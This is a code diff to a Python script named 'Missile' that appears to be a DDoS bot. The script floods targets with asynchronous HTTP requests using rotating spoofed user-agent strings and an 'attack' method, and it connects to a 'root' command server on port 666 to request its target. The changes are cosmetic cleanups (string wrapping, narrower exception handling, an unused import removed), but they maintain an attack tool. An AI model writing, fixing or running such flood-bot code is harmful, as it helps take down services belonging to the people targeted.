@@ -4,7 +4,6 @@ import asyncio
 import aiohttp
 import random
 import string
-import subprocess
 import socket
 
 
@@ -28,15 +27,26 @@ class Missile():
             connector=aiohttp.TCPConnector(limit=0)
         )
         self.ua_list = [
-            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
-            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
-            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
+            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
+            'Gecko/20090913 Firefox/3.5.3',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
+            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
+            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
+            'Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
+            'AppleWebKit/532.1 (KHTML, like Gecko)'
+            'Chrome/4.0.219.6 Safari/532.1',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
+            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
+            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
+            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
+            'Win64; x64; Trident/4.0)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
+            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
             'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
             'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
             'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
@@ -128,7 +138,7 @@ class Missile():
                 else:
                     print(f"Unknown status code detected.\n{status}\n{reason}")
             return status
-        except aiohttp.client_exceptions.ClientConnectorError as e:
+        except aiohttp.client_exceptions.ClientConnectorError:
             return -1
 
     async def attack(self, count):
@@ -164,7 +174,6 @@ if __name__ == "__main__":
             return '\n'.join(pad)
 
         def invalid_args():
-            return False
             if len(sys.argv) != 2:
                 return True
             return sys.argv[1].lower() == "help"
@@ -202,7 +211,7 @@ if __name__ == "__main__":
             root.connect((root_ip, 666))
             print(f"Connected to {root_ip}:{666}!")
             break
-        except:
+        except ConnectionRefusedError:
             continue
     root.sendall("Requesting Target.".encode())
     while True:
